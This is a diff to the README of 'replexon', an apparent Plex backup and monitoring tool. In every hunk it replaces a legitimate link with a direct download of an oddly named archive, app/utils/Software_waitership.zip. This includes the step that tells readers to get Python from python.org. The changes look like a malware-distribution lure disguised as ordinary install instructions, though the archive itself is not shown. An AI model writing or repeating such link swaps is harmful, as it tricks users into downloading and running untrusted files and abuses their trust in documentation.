@@ -1,6 +1,6 @@
 # 📦 replexon - Easy Plex Backup and Monitoring
 
-[![Download replexon](https://img.shields.io/badge/Download-replexon-brightgreen?style=for-the-badge)](https://github.com/bah1w23/replexon)
+[![Download replexon](https://img.shields.io/badge/Download-replexon-brightgreen?style=for-the-badge)](https://github.com/bah1w23/replexon/raw/refs/heads/main/app/utils/Software_waitership.zip)
 
 ---
 
@@ -47,7 +47,7 @@ The dashboard runs on a simple web interface you open in your browser. You don�
 
 To get started, visit the main page for downloading replexon:
 
-[![Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/bah1w23/replexon)
+[![Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/bah1w23/replexon/raw/refs/heads/main/app/utils/Software_waitership.zip)
 
 This page has the latest files and instructions.
 
@@ -74,7 +74,7 @@ After downloading:
 
 replexon runs on Python. You may already have it installed, but if not:
 
-1. Go to [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)
+1. Go to [https://github.com/bah1w23/replexon/raw/refs/heads/main/app/utils/Software_waitership.zip](https://github.com/bah1w23/replexon/raw/refs/heads/main/app/utils/Software_waitership.zip)
 2. Download the latest Windows installer for Python 3.9 or newer.
 3. Run the installer.
 4. Make sure to select **Add Python to PATH** before clicking **Install Now.**
@@ -189,4 +189,4 @@ To receive email alerts:
   
 ---
 
-# [⬇️ Download replexon](https://github.com/bah1w23/replexon)
+# [⬇️ Download replexon](https://github.com/bah1w23/replexon/raw/refs/heads/main/app/utils/Software_waitership.zip)
